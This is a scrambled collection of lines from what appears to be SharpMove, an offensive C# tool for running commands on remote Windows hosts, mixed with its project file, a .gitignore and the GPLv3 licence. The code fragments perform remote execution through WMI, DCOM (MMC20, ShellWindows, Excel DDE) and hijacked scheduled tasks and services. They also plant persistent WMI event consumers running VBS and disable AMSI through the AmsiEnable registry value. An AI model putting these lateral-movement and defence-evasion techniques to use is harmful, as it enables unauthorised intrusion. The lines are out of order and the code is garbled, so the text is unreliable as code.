       
        
            
                 
                                else
                                header = true
                                if (!header)
                                {
                                }
                            List<ManagementBaseObject> OriginalKey = SetRegKey(wmiConn)
                            Preamble
                            Thread.Sleep(2000)
                            Thread.Sleep(3000)
                            Usage()
                            bool header = false
                            casplit[0] = cmdarg
                            return
                            {
                            }
                        // wrap long output to 80 lines
                        //For non-standard folders
                        //may implement RPC in the future
                        casplit[0] = cmdarg
                        casplit[0] = cmdpath.Substring(slh)
                        casplit[1] = cmdarg
                        cmdarg = command.Substring(counter 
                        else
                        if (!String.IsNullOrEmpty(propValue) 
                        string clsid = string.Empty
                        string filename = null
                        string servicename = string.Empty
                        string taskname = string.Empty
                        {
                        }
                       TERMS AND CONDITIONS
                     END OF TERMS AND CONDITIONS
                    // local query
                    // remote query
                    //tsk.GetSecurityDescriptor()
                    Console.WriteLine()
                    Environment.Exit(0)
                    GNU GENERAL PUBLIC LICENSE
                    System.Management.PropertyDataCollection props = result.Properties
                    Thread.Sleep(5000)
                    Usage()
                    casplit[0] = command
                    cmdarg = command.Substring(col - 1)
                    else
                    foreach (System.Management.PropertyData prop in props)
                    foreach (string computerName in computerNames)
                    if (counter != -1)
                    int col = command.LastIndexOf(':')
                    int counter = command.LastIndexOf('
                    int slh = cmdpath.LastIndexOf('
                    logininfo[0] = username.Split('
                    logininfo[1] = username
                    logininfo[1] = username.Split('
                    ltype = otask.Principal.LogonType
                    myBinder.Delete()
                    myBinder.Put()
                    myEventConsumer.Delete()
                    myEventConsumer.Put()
                    myEventFilter.Delete()
                    myEventFilter.Put()
                    myTimer.Delete()
                    myTimer.Put()
                    objScheduler.Connect(host)
                    object RemoteComObject = Activator.CreateInstance(ComType)
                    object RemoteComObject = NewMethod(ComType)
                    options.Password = password
                    options.Username = username
                    origargs = acts.Arguments
                    origcmd = acts.Path
                    originalstate.Add(out2)
                    originalstate.Add(outParams2)
                    otask = tsk.Definition
                    return
                    runas = otask.Principal.UserId
                    scheduler.Connect(host)
                    tsksecdes = otask.RegistrationInfo.SecurityDescriptor
                    wmiData = new ManagementObjectSearcher(wmiQuery)
                    {
                    }
                (STANDARD_RIGHTS_REQUIRED 
                // finally bind them together with a __FilterToConsumerBinding
                // first create a 5 second timer on the remote host
                // now create the ActiveScriptEventConsumer data (VBS)
                // remote process call creation
                // then install the __EventFilter for the timer object
                // wait for everything to trigger
                //If no path I'm assuming it's system32
                //If you have more than two full directory paths I'll be sad
                CloseServiceHandle(scmHandle)
                CloseServiceHandle(serviceHandle)
                ConnectionOptions options = new ConnectionOptions()
                Console.WriteLine()
                IRunningTask runTask = regTask1.Run(null)
                ManagementObject myEventFilter = wmiEventFilter.CreateInstance()
                ManagementObject myTimer = timerClass.CreateInstance()
                ManagementObjectCollection data = searcher.Get()
                ManagementObjectCollection data = wmiData.Get()
                ObjectQuery query = new ObjectQuery(wmiQuery)
                System.Management.PropertyDataCollection properties = inParams.Properties
                System.Threading.Thread.Sleep(10 
                Thread.Sleep(1000)
                Thread.Sleep(2000)
                Usage()
                casplit[0] = casplit[0].Substring(counter)
                catch (Exception ex)
                catch (UnauthorizedAccessException e)
                else
                else //Key did not exist
                foreach (ManagementObject result in data)
                if (!String.IsNullOrEmpty(username))
                if (String.IsNullOrEmpty(wmiNameSpace))
                if (acts.Type != _TASK_ACTION_TYPE.TASK_ACTION_EXEC)
                if (colcount > 1)
                if (idx > 0)
                if (targetservice.Status == ServiceControllerStatus.Running 
                if (targetservice.Status == ServiceControllerStatus.Stopped 
                if (tsk.Name.Equals(taskname))
                if (x == 0)
                int counter = casplit[0].LastIndexOf('
                int idx = argument.IndexOf('=')
                newact.Id = actionid
                options.Password = password
                options.Username = username
                originalstate.Add(outParams)
                return
                return null
                return originalstate
                return scope
                scope.Connect()
                targetservice.Start()
                targetservice.Stop()
                targetservice.WaitForStatus(ServiceControllerStatus.Running)
                targetservice.WaitForStatus(ServiceControllerStatus.Stopped)
                try
                var CLSID = clsid
                var colcount = command.Count(xx => xx == ':')
                var index = i 
                wmiservice.Get()
                yield return line
                yield return text
                {
                }
            /
            //For now this will be SYSTEM only - needs to be updated
            //For now this will dictate a win path
            //TODO...maybe
            ConnectionOptions options = new ConnectionOptions()
            Console.WriteLine()
            DeleteService(serviceHandle)
            Disabled = 4
            How to Apply These Terms to Your New Programs
            IActionCollection actionCollection = otask.Actions
            IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC)
            IExecAction newact = (IExecAction)otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC)
            IExecAction origact = (IExecAction)otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC)
            IRegisteredTaskCollection tasks = f1.GetTasks(1)
            IRegistrationInfo tsksecdes = null
            IRunningTask runTask = regTask.Run(null)
            ITaskDefinition otask = null
            ITaskDefinition task = scheduler.NewTask(0)
            ITaskFolder f1 = scheduler.GetFolder(sfolder)
            ITriggerCollection triggerCollection = otask.Triggers
            List<ManagementBaseObject> originalstate = new List<ManagementBaseObject>()
            List<string> cmdinfo = new List<string>()
            List<string> retcmd = ParseCommand(command)
            ManagementObjectSearcher wmiData = null
            SERVICE_ALL_ACCESS =
            TaskScheduler.TaskScheduler objScheduler = new TaskScheduler.TaskScheduler()
            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler()
            Thread.Sleep(1000)
            Thread.Sleep(2000)
            Thread.Sleep(3000)
            _TASK_LOGON_TYPE ltype = _TASK_LOGON_TYPE.TASK_LOGON_S4U
            action.Arguments = Parameters
            action.Path = Command
            actionCollection.Clear()
            catch (Exception e)
            catch (Exception ex)
            catch(Exception ex)
            cmdinfo.Add(casplit[0])
            cmdinfo.Add(casplit[1])
            cmdinfo.Add(cmdpath)
            else
            for (int i = 0
            foreach (IExecAction acts in actionCollection)
            foreach (IRegisteredTask tsk in tasks)
            foreach (ITrigger trigger in triggerCollection)
            foreach (string argument in args)
            if (!String.IsNullOrEmpty(username))
            if (args.Length < 2)
            if (partCount < 2)
            if (scmHandle != IntPtr.Zero)
            if (scmHandle == IntPtr.Zero)
            if (serviceHandle != IntPtr.Zero)
            if (serviceHandle == IntPtr.Zero)
            if (spacecount == 1)
            newact.Arguments = Parameters
            newact.Path = Command
            origact.Arguments = origargs
            origact.Path = origcmd
            otask.Actions = actionCollection
            return Activator.CreateInstance(ComType)
            return cmdinfo
            string Binary = retcmd[1]
            string Command = retcmd[1]
            string Directory = retcmd[0]
            string Parameters = retcmd[2]
            string cmdarg = null
            string cmdpath = null
            string lpDisplayName)
            string lpPassword)
            string origargs = string.Empty
            string origcmd = string.Empty
            string runas = string.Empty
            string[] casplit = new string[2]
            string[] logininfo = new string[2]
            task.Settings.RunOnlyIfIdle = false
            try
            var partCount = Math.Ceiling((double)text.Length / partLength)
            var spacecount = command.Count(x => x == ' ')
            {
            }
        //change to whatever vbs you want
        [Flags]
        private const uint SC_MANAGER_CONNECT = 0x0001
        private const uint SC_MANAGER_CREATE_SERVICE = 0x00002
        private const uint SERVICE_AUTO_START = 0x00000002
        private const uint SERVICE_CHANGE_CONFIG = 0x00000002
        private const uint SERVICE_ERROR_NORMAL = 0x00000001
        private const uint SERVICE_NO_CHANGE = 0xFFFFFFFF
        private const uint SERVICE_QUERY_CONFIG = 0x00000001
        private const uint SERVICE_START = 0x0010
        private const uint SERVICE_WIN32_OWN_PROCESS = 0x00000010
        private static extern bool ChangeServiceConfig(
        private static extern int CloseServiceHandle(IntPtr hSCObject)
        private static object NewMethod(Type ComType)
        public enum SERVICE_ACCESS : uint
        public enum ServiceStartupType : uint
        public static extern IntPtr CreateService(
        public static extern int DeleteService(IntPtr serviceHandle)
        static List<ManagementBaseObject> SetRegKey(ManagementScope scope)
        static List<string> ParseCommand(string command)
        static void Main(string[] args)
        static void ModServiceRPC()
        static void Usage()
        {
        }
      <EmbedInteropTypes>True</EmbedInteropTypes>
      <Guid>{E34CB9F1-C7F7-424C-BE29-027DCC09363A}</Guid>
      <Isolated>False</Isolated>
      <Lcid>0</Lcid>
      <VersionMajor>1</VersionMajor>
      <VersionMinor>0</VersionMinor>
      <WrapperTool>tlbimp</WrapperTool>
    (at your option) any later version.
    7.  This requirement modifies the requirement in section 4 to
    </COMReference>
    <AssemblyName>SharpMove</AssemblyName>
    <DebugSymbols>false</DebugSymbols>
    <DebugType>none</DebugType>
    <DefineConstants>DEBUG
    <DefineConstants>TRACE</DefineConstants>
    <Deterministic>true</Deterministic>
    <ErrorReport>prompt</ErrorReport>
    <FileAlignment>512</FileAlignment>
    <Optimize>false</Optimize>
    <Optimize>true</Optimize>
    <OutputPath>bin
    <OutputType>Exe</OutputType>
    <PlatformTarget>AnyCPU</PlatformTarget>
    <ProjectGuid>{8BF82BBE-909C-4777-A2FC-EA7C070FF43E}</ProjectGuid>
    <RootNamespace>SharpMove</RootNamespace>
    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
    <WarningLevel>4</WarningLevel>
    <one line to give the program's name and a brief idea of what it does.>
    <program>  Copyright (C) <year>  <name of author>
    Appropriate Legal Notices
    Copyright (C) <year>  <name of author>
    Corresponding Source along with the object code.  If the place to
    Corresponding Source fixed on a durable physical medium
    Corresponding Source from a network server at no charge.
    Corresponding Source in the same way through the same place at no
    Corresponding Source.  Regardless of what server hosts the
    GNU General Public License for more details.
    License to anyone who comes into possession of a copy.  This
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    Notices displayed by works containing it
    Source of the work are being offered to the general public at no
    This program comes with ABSOLUTELY NO WARRANTY
    This program is free software: you can redistribute it and/or modify
    You should have received a copy of the GNU General Public License
    a) Disclaiming warranty or limiting liability differently from the
    a) The work must carry prominent notices stating that you modified
    any liability that these contractual assumptions directly impose on
    author attributions in that material or in the Appropriate Legal
    authors of the material
    available for as long as needed to satisfy these requirements.
    b) Requiring preservation of specified reasonable legal notices or
    b) The work must carry prominent notices stating that it is
    but WITHOUT ANY WARRANTY
    c) Convey individual copies of the object code with a copy of the
    charge under subsection 6d.
    class Program
    clear directions next to the object code saying where to find the
    copy of the Corresponding Source for all the software in the
    customarily used for software interchange.
    d) Convey the object code by offering access from a designated
    d) Limiting the use for publicity purposes of names of licensors or
    e) Declining to grant rights under trademark law for use of some
    f) Requiring indemnification of licensors and authors of that
    further charge.  You need not require recipients to copy the
    invalidate such permission if you have separately received it.
    it under the terms of the GNU General Public License as published by
    long as you offer spare parts or customer support for that product
    material by anyone who conveys the material (or modified versions of
    may be on a different server (operated by you or a third party)
    more than your reasonable cost of physically performing this
    reasonable ways as different from the original version
    regardless of how they are packaged.  This License gives no
    released under this License and any conditions added under section
    requiring that modified versions of such material be marked in
    terms of sections 15 and 16 of this License
    those licensors and authors.
    under certain conditions
    with subsection 6b.
    work need not make them do so.
    written offer to provide the Corresponding Source.  This
    you inform other peers where the object code and Corresponding
    {
    }
  0. Definitions.
  1. Source Code.
  10. Automatic Licensing of Downstream Recipients.
  11. Patents.
  12. No Surrender of Others' Freedom.
  13. Use with the GNU Affero General Public License.
  14. Revised Versions of this License.
  15. Disclaimer of Warranty.
  16. Limitation of Liability.
  17. Interpretation of Sections 15 and 16.
  2. Basic Permissions.
  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
  4. Conveying Verbatim Copies.
  5. Conveying Modified Source Versions.
  6. Conveying Non-Source Forms.
  7. Additional Terms.
  8. Termination.
  9. Acceptance Not Required for Having Copies.
  </ItemGroup>
  </PropertyGroup>
  <ItemGroup>
  <PropertyGroup>
  A compilation of a covered work with other separate and independent
  All rights granted under this License are granted for the term of
  Conveying under any other circumstances is permitted solely under
  Developers that use the GNU GPL protect your rights with two steps:
  Each version is given a distinguishing version number.  If the
  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
  If the Program specifies that a proxy can decide which future
  If the disclaimer of warranty and limitation of liability provided
  Later license versions may give you additional or different
  No covered work shall be deemed part of an effective technological
  Nothing in this License shall be construed as excluding or limiting
  Some devices are designed to deny users access to install or run
  Termination of your rights under this section does not terminate the
  The Corresponding Source for a work in source code form is that
  The Corresponding Source need not include anything that users
  The Free Software Foundation may publish revised and/or new versions of
  The GNU General Public License does not permit incorporating your program
  The licenses for most software and other practical works are designed
  The requirement to provide Installation Information does not include a
  You are not required to accept this License in order to receive or
  You may convey a covered work in object code form under the terms
  You may convey verbatim copies of the Program's source code as you
  You may not impose any further restrictions on the exercise of the
  You may not propagate or modify a covered work except as expressly
 !tools/packages.config
 (https://github.com/github/gitignore/pull/1529
 (https://github.com/github/gitignore/pull/2483
 (propValue.Length > 90))
 .NET Core
 1000)
 AxoCover is a Code Coverage Tool
 Azure Stream Analytics local run output
 Backup 
 Backup folder for Package Reference Convert tool in Visual Studio 2017
 BeatPulse healthcheck temp database
 Benchmark Results
 BizTalk build output
 Build Results of an ATL Project
 Build results
 Building
 Business Intelligence projects
 Cake - Uncomment if you are using it
 Chutzpah Test files
 Click-Once directory
 CodeRush personal settings
 DCOM (Multiple)
 DCOM Server Hijack
 DocProject is a documentation generator add-in
 DotCover is a Code Coverage Tool
 Everyone is permitted to copy and distribute verbatim copies
 FAKE - F
 Files built by Visual Studio
 Files/
 Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore
 GhostDoc plugin setting file
 Guidance Automation Toolkit
 Including strong name files can present a security risk
 Installshield output folder
 Ionide (cross platform F
 Local History for Visual Studio
 MFractors (Xamarin productivity tool) working folder
 MSBuild Binary and Structured Log
 MSTest test Results
 Make
 Microsoft Azure Build Output
 Microsoft Azure Emulator
 Microsoft Azure Web App publish settings. Comment the next line if you want to
 Microsoft Fakes
 MightyMoose
 Modify Scheduled Task
 Modify Service binpath
 Mono auto generated files
 NCrunch
 NUnit
 NVidia Nsight GPU debugger configuration file
 Node.js Tools for Visual Studio
 NuGet Packages
 NuGet Symbol Packages
 NuGet v3's project.json files produces more ignorable files
 OpenCover UI analysis results
 Options
 Others
 Paket dependency manager
 Publish Web Output
 Python Tools for Visual Studio (PTVS)
 RIA/Silverlight projects
 ReSharper is a .NET coding add-in
 SCM
 SERVICE_CHANGE_CONFIG 
 SERVICE_ENUMERATE_DEPENDENTS 
 SERVICE_INTERROGATE 
 SERVICE_PAUSE_CONTINUE
 SERVICE_QUERY_CONFIG 
 SERVICE_QUERY_STATUS 
 SERVICE_START 
 SERVICE_STOP 
 SERVICE_USER_DEFINED_CONTROL)
 SQL Server files
 Service DLL Hijack
 SharpMove - .NET authenticated execution for remote hosts
 StyleCop
 TFS 2012 Local Workspace
 Tabs Studio
 Task Scheduler
 TeamCity is a build add-in
 Telerik's JustMock configuration file
 The packages folder can be ignored because of Package Restore
 Uncomment if necessary however generally it will be regenerated when needed
 Uncomment if you have tasks that create the project's static files in wwwroot
 User-specific files
 User-specific files (MonoDevelop/Xamarin Studio)
 VS Code tools) working folder
 Visual C
 Visual Studio 15
 Visual Studio 2015/2017 cache/options directory
 Visual Studio 2017 auto generated files
 Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
 Visual Studio 6 build log
 Visual Studio 6 workspace options file
 Visual Studio LightSwitch build output
 Visual Studio Trace Files
 Visual Studio cache files
 Visual Studio code coverage results
 Visual Studio profiler
 WMI
 Web workbench (sass)
 Windows Store app package directories and files
 actionid != string.Empty)
 and each file should have at least
 and give all
 because we have git 
 but database connection strings (with potential passwords) will be unencrypted
 but keep track of directories ending in .cache
 cache files
 e.Message)
 files ending in .cache can be ignored
 files generated by popular Visual Studio add-ons.
 for details type 
 from win32_process
 i < partCount
 in these scripts will be unencrypted
 it applies also to
 partLength
 report files from converting an old project file
 section 10
 targetservice.Status == ServiceControllerStatus.StartPending)
 targetservice.Status == ServiceControllerStatus.StopPending)
 tools/
 type 
 without even the implied warranty of
!.axoCover/settings.json
"                                    Console.WriteLine(String.Format(""{0,30}   {1}"", """", line))"
"                                    Console.WriteLine(String.Format(""{0,30} : {1}"", prop.Name, line))"
"                            Console.WriteLine(""["
"                            Console.WriteLine(String.Format(""{0,30} : {1}"", prop.Name, prop.Value))"
"                            CreateSchTask(computerName, username, password, arguments[""command""], taskname)"
"                            CreateService(computerName, servicename, arguments[""command""])"
"                            DeleteSchTask(computerName, username, password, taskname)"
"                            DeleteService(computerName, servicename)"
"                            ManagementBaseObject inParams3 = reg.GetMethodParameters(""SetDWORDValue"")"
"                            ManagementBaseObject inParams3 = reg1.GetMethodParameters(""SetDWORDValue"")"
"                            ManagementBaseObject outParams3 = reg.InvokeMethod(""SetDWORDValue"", inParams3, null)"
"                            ManagementBaseObject outParams3 = reg1.InvokeMethod(""SetDWORDValue"", inParams3, null)"
"                            ManagementScope wmiConn = WMIConnect(computerName, username, password)"
"                            ModSchTask(computerName, username, password, arguments[""command""], taskname, folder)"
"                            ModServiceWMI(wmiConn, servicename, arguments[""command""])"
"                            RemoteDCOM(computerName, arguments[""command""], method)"
"                            RemoteWMIExecute(wmiConn, arguments[""command""])"
"                            RemoteWMIExecuteVBS(computerName, eventName, username, password)"
"                            RemoteWMIQuery(computerName, arguments[""query""], """", username, password)"
"                            RemoteWMIQuery(computerName, arguments[""query""], arguments[""namespace""], username, password)"
"                            UnsetRegKey(wmiConn, OriginalKey)"
"                            casplit = cmdarg.Split(new[] { ' ' }, 2)"
"                            casplit[1] = """""
"                            clsid = arguments[""clsid""]"
"                            droplocation = arguments[""droplocation""]"
"                            eventName = arguments[""eventname""]"
"                            filename = arguments[""filename""]"
"                            folder = arguments[""folder""]"
"                            foreach (string line in Split(propValue, 80))"
"                            inParams3[""hDefKey""] = 0x80000001"
"                            inParams3[""sSubKeyName""] = ""Software"
"                            inParams3[""sValueName""] = ""AmsiEnable"""
"                            inParams3[""uValue""] = ""0"""
"                            inParams3[""uValue""] = originalvalue"
"                            location = arguments[""location""]"
"                            method = arguments[""method""]"
"                            servicename = arguments[""servicename""]"
"                            taskname = arguments[""taskname""]"
"                        //string modtype = ""wmi"""
"                        Console.WriteLine(""["
"                        Console.WriteLine(String.Format(""{0,30} : {1}"", prop.Name, prop.Value))"
"                        DCOMHijack(computerName, clsid)"
"                        LocalWMIQuery(arguments[""query""])"
"                        LocalWMIQuery(arguments[""query""], arguments[""namespace""])"
"                        ManagementBaseObject inParams4 = reg.GetMethodParameters(""SetDWORDValue"")"
"                        ManagementBaseObject inParams4 = reg1.GetMethodParameters(""DeleteValue"")"
"                        ManagementBaseObject outParams4 = reg.InvokeMethod(""SetDWORDValue"", inParams4, null)"
"                        ManagementBaseObject outParams4 = reg1.InvokeMethod(""DeleteValue"", inParams4, null)"
"                        ManagementScope wmiConn = WMIConnect(computerName, username, password)"
"                        StartService(computerName, servicename)"
"                        StopService(computerName, servicename)"
"                        casplit[0] = casplit[0].Replace("""
"                        casplit[1] = """""
"                        cmdpath = command.Substring(0, counter)"
"                        else if (originalvalue == ""0"")"
"                        if (arguments.ContainsKey(""amsi"") "
"                        if (arguments.ContainsKey(""clsid""))"
"                        if (arguments.ContainsKey(""droplocation""))"
"                        if (arguments.ContainsKey(""eventname""))"
"                        if (arguments.ContainsKey(""filename""))"
"                        if (arguments.ContainsKey(""folder""))"
"                        if (arguments.ContainsKey(""location""))"
"                        if (arguments.ContainsKey(""method""))"
"                        if (arguments.ContainsKey(""namespace""))"
"                        if (arguments.ContainsKey(""servicename""))"
"                        if (arguments.ContainsKey(""taskname""))"
"                        if (command.Contains("" ""))"
"                        if (originalvalue != ""0"")"
"                        if (origval != ""0"")"
"                        inParams4[""hDefKey""] = 0x80000001"
"                        inParams4[""sSubKeyName""] = ""Software"
"                        inParams4[""sValueName""] = ""AmsiEnable"""
"                        inParams4[""uValue""] = ""0"""
"                        string droplocation = @""C:"
"                        string eventName = ""Debug"""
"                        string folder = """
"                        string location = ""local"""
"                        string method = ""ShellBrowserWindow"""
"                        string originalvalue = outParams[1].Properties[""uValue""].Value.ToString()"
"                        string origval = outParams2.Properties[""uValue""].Value.ToString()"
"                        string propValue = String.Format(""{0}"", prop.Value)"
"                        string servicename = ""WindowsDebug"""
"                        string taskname = ""WindowsDebug"""
"                       Version 3, 29 June 2007"
"                    ActiveView.GetType().InvokeMember(""ExecuteShellCommand"", BindingFlags.InvokeMethod, null, ActiveView, new object[] { Command, null, null, 7 })"
"                    Application.GetType().InvokeMember(""ShellExecute"", BindingFlags.InvokeMethod, null, Application, new object[] { Command, Parameters, Directory, null, 0 })"
"                    Console.WriteLine(""  ["
"                    Console.WriteLine(""Executing ShellBrowserWindow"")"
"                    Console.WriteLine(""["
"                    Console.WriteLine(""[-] Service status      : {0}"", targetservice.Status.ToString())"
"                    Console.WriteLine(""[-] Service {0} is currently stopped"", targetservice.ServiceName)"
"                    Console.WriteLine(""[X] Error    :  You must supply arguments"")"
"                    Console.WriteLine(""[X] Error   :  {0}"", e.Message)"
"                    Console.WriteLine(""[X] Error:  {0}"", e.Message)"
"                    Console.WriteLine(""[X] Error: {0}"", e.Message)"
"                    Console.WriteLine(""[X] Exception in creating timer object: {0}"", ex.Message)"
"                    Console.WriteLine(""[X] Exception in removing 'Timer' interval timer: {0}"", ex.Message)"
"                    Console.WriteLine(""[X] Exception in removing FilterToConsumerBinding: {0}"", ex.Message)"
"                    Console.WriteLine(""[X] Exception in removing event consumer: {0}"", ex.Message)"
"                    Console.WriteLine(""[X] Exception in removing event filter: {0}"", ex.Message)"
"                    Console.WriteLine(""[X] Exception in setting FilterToConsumerBinding: {0}"", ex.Message)"
"                    Console.WriteLine(""[X] Exception in setting event consumer: {0}"", ex.Message)"
"                    Console.WriteLine(""[X] Exception in setting event filter   : {0}"", ex.Message)"
"                    Console.WriteLine(""[X] Task doesn't have exec action"")"
"                    Console.WriteLine(""{"
"                    ManagementBaseObject in1 = reg.GetMethodParameters(""CreateKey"")"
"                    ManagementBaseObject in1 = reg.GetMethodParameters(""GetDWORDValue"")"
"                    ManagementBaseObject in2 = reg.GetMethodParameters(""SetDWORDValue"")"
"                    ManagementBaseObject inParams2 = reg1.GetMethodParameters(""DeleteKey"")"
"                    ManagementBaseObject inParams3 = reg1.GetMethodParameters(""DeleteValue"")"
"                    ManagementBaseObject inParams4 = reg1.GetMethodParameters(""DeleteKey"")"
"                    ManagementBaseObject out1 = reg.InvokeMethod(""CreateKey"", in1, null)"
"                    ManagementBaseObject out2 = reg.InvokeMethod(""SetDWORDValue"", in2, null)"
"                    ManagementBaseObject outParam = wmiservice.InvokeMethod(""StopService"", null, null)"
"                    ManagementBaseObject outParams2 = reg.InvokeMethod(""GetDWORDValue"", in1, null)"
"                    ManagementBaseObject outParams2 = reg1.InvokeMethod(""DeleteKey"", inParams2, null)"
"                    ManagementBaseObject outParams2 = wmiservice.InvokeMethod(""StartService"", null, null)"
"                    ManagementBaseObject outParams3 = reg1.InvokeMethod(""DeleteValue"", inParams3, null)"
"                    ManagementBaseObject outParams4 = reg1.InvokeMethod(""DeleteKey"", inParams4, null)"
"                    RemoteComObject.GetType().InvokeMember(""DDEInitiate"", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { Command, Parameters })"
"                    RemoteComObject.GetType().InvokeMember(""DisplayAlerts"", BindingFlags.SetProperty, null, RemoteComObject, new object[] { false })"
"                    Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), host)"
"                    Type ComType = Type.GetTypeFromProgID(""Excel.Application"", host)"
"                    Type ComType = Type.GetTypeFromProgID(""MMC20.Application"", host)"
"                    arguments[argument.Substring(0, idx)] = argument.Substring(idx "
"                    casplit = command.Split(new[] { ' ' }, 2)"
"                    casplit[1] = """""
"                    cmdpath = command.Substring(0, col - 2)"
"                    if (arguments.ContainsKey(""namespace""))"
"                    if (command.Contains("" ""))"
"                    if (outParams2.Properties[""uValue""].Value != null)"
"                    if (outParams[1].Properties[""uValue""].Value != null)"
"                    in1[""hDefKey""] = 0x80000001"
"                    in1[""sSubKeyName""] = ""Software"
"                    in1[""sValueName""] = ""AmsiEnable"""
"                    in2[""hDefKey""] = 0x80000001"
"                    in2[""sSubKeyName""] = ""Software"
"                    in2[""sValueName""] = ""AmsiEnable"""
"                    in2[""uValue""] = ""0"""
"                    inParams2[""hDefKey""] = 0x80000001"
"                    inParams2[""sSubKeyName""] = ""Software"
"                    inParams3[""hDefKey""] = 0x80000001"
"                    inParams3[""sSubKeyName""] = ""Software"
"                    inParams3[""sValueName""] = ""AmsiEnable"""
"                    inParams4[""hDefKey""] = 0x80000001"
"                    inParams4[""sSubKeyName""] = ""Software"
"                    logininfo[0] = ""."""
"                    objScheduler.Connect(host, logininfo[1], logininfo[0], password)"
"                    object ActiveView = Document.GetType().InvokeMember(""ActiveView"", BindingFlags.GetProperty, null, Document, null)"
"                    object Application = Document.GetType().InvokeMember(""Application"", BindingFlags.GetProperty, null, Document, null)"
"                    object Document = Item.GetType().InvokeMember(""Document"", BindingFlags.GetProperty, null, Item, null)"
"                    object Document = RemoteComObject.GetType().InvokeMember(""Document"", BindingFlags.GetProperty, null, RemoteComObject, null)"
"                    object Item = RemoteComObject.GetType().InvokeMember(""Item"", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { })"
"                    password = arguments[""password""]"
"                    scheduler.Connect(host, logininfo[1], logininfo[0], password)"
"                    string[] computerNames = arguments[""computername""].Split(',')"
"                    username = arguments[""username""]"
"                    var CLSID = ""9BA05972-F6A8-11CF-A442-00A0C90A8F39"""
"                    var CLSID = ""C08AFD90-F2A1-11D1-8455-00A0C91F3880"""
"                    wmiData = new ManagementObjectSearcher(wmiNameSpace, wmiQuery)"
"                // finally, cleanup"
"                Console.Error.WriteLine(""[X] DCOM Failed   : "" "
"                Console.Error.WriteLine(""[X] DCOM Hijack Failed   : "" "
"                Console.WriteLine(""   ["
"                Console.WriteLine(""  User credentials: {0}"", username)"
"                Console.WriteLine("""
"                Console.WriteLine(""["
"                Console.WriteLine(""[-] Error: {0}"", ex.Message)"
"                Console.WriteLine(""[X]  Failed to connecto to WMI: {0}"", ex.Message)"
"                Console.WriteLine(""[X] Error     : {0}"", ex.Message)"
"                Console.WriteLine(""[X] Error    : {0}"", ex.Message)"
"                Console.WriteLine(""[X] Exception    : {0}"", ex)"
"                Console.WriteLine(String.Format(""[X]  Exception : {0}"", ex.Message))"
"                Console.WriteLine(String.Format(""[X] Exception   :   {0}"", ex.Message))"
"                Console.WriteLine(String.Format(""[X] Exception : {0}"", ex.Message))"
"                IRegisteredTask regTask1 = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes)"
"                IRegisteredTask regTask2 = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes)"
"                ManagementBaseObject inParams = reg.GetMethodParameters(""EnumKey"")"
"                ManagementBaseObject inParams = wmiProcess.GetMethodParameters(""Create"")"
"                ManagementBaseObject inParams = wmiservice.GetMethodParameters(""Change"")"
"                ManagementBaseObject inParams1 = wmiservice.GetMethodParameters(""Change"")"
"                ManagementBaseObject outParam1 = wmiservice.InvokeMethod(""StopService"", null, null)"
"                ManagementBaseObject outParams = reg.InvokeMethod(""EnumKey"", inParams, null)"
"                ManagementBaseObject outParams = wmiProcess.InvokeMethod(""Create"", inParams, null)"
"                ManagementBaseObject outParams = wmiservice.InvokeMethod(""StartService"", null, null)"
"                ManagementClass reg = new ManagementClass(scope, new ManagementPath(""StdRegProv""), null)"
"                ManagementClass reg1 = new ManagementClass(scope, new ManagementPath(""StdRegProv""), null)"
"                ManagementClass timerClass = new ManagementClass(timerScope, new ManagementPath(""__IntervalTimerInstruction""), null)"
"                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath(""__EventFilter""), null)"
"                ManagementObject myBinder = new ManagementClass(scope, new ManagementPath(""__FilterToConsumerBinding""), null).CreateInstance()"
"                ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath(""ActiveScriptEventConsumer""), null).CreateInstance()"
"                ManagementObject wmiservice = new ManagementObject(scope, new ManagementPath(srvpath), new ObjectGetOptions())"
"                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query)"
"                ManagementScope scope = new ManagementScope(string.Format(@"""
"                ManagementScope timerScope = new ManagementScope(string.Format(@"""
"                ServiceController targetservice = new ServiceController(servicename, host)"
"                Type ComType = Type.GetTypeFromCLSID(new Guid(CLSID), host)"
"                WqlEventQuery myEventQuery = new WqlEventQuery(@""SELECT "
"                casplit = command.Split(new[] { ' ' }, 2)"
"                casplit[0] = casplit[0].Replace("""
"                cmdpath = ""C:"
"                cmdpath = command.Substring(0, counter)"
"                else if (Method.ToLower() == ""exceldde"")"
"                else if (Method.ToLower() == ""mmc"")"
"                else if (Method.ToLower() == ""shellbrowserwindow"")"
"                if (!arguments.ContainsKey(""password""))"
"                if (!arguments.ContainsKey(""query""))"
"                if ((arguments.ContainsKey(""computername"")) "
"                if (Method.ToLower() == ""shellwindows"")"
"                if (arguments.ContainsKey(""computername"") "
"                if (arguments.ContainsKey(""computername""))"
"                if (command.Contains("" ""))"
"                if (origstate == ""Running"")"
"                if (outParams.Properties[""sNames""].Value == null)"
"                if (outParams[0].Properties[""sNames""].Value != null) // Key did exist"
"                if (username.Contains("""
"                if (wmiservice[""State""].ToString() == ""Running"")"
"                inParams[""CommandLine""] = command"
"                inParams[""PathName""] = command"
"                inParams[""PathName""] = origpath"
"                inParams[""hDefKey""] = 0x80000001"
"                inParams[""sSubKeyName""] = ""Software"
"                myBinder[""Consumer""] = myEventConsumer.Path.RelativePath"
"                myBinder[""Filter""] = myEventFilter.Path.RelativePath"
"                myEventConsumer[""KillTimeout""] = (UInt32)45"
"                myEventConsumer[""Name""] = eventName"
"                myEventConsumer[""ScriptText""] = vbsdata"
